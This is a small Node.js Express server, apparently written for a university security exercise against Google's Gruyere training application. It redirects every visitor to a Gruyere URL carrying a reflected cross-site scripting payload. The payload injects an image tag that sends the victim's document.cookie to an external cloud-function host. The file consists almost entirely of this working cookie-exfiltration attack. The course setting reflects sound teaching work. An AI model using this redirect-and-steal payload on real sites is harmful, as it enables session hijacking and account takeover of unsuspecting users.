'use strict'

const default_port = 8888
const port = process.argv[2] || default_port

const express = require('express')
const app = express()

app.use('/', (req, res) => {
    res.redirect(`https://google-gruyere.appspot.com/354189677610052710631975174902398196525/%3Cscript%3Edocument.write(%60%3Cimg%20src='http://europe-west3-si-2020-2021-299801.cloudfunctions.net/si2021serie3%3Fgroup=G095XD&cookie=$%7Bdocument.cookie%7D&gkey=z0g41qpshynaocloqg9cm'%3E%60)%3C/script%3E`);
})

app.listen(port, () => console.log(`Listening ${port}`))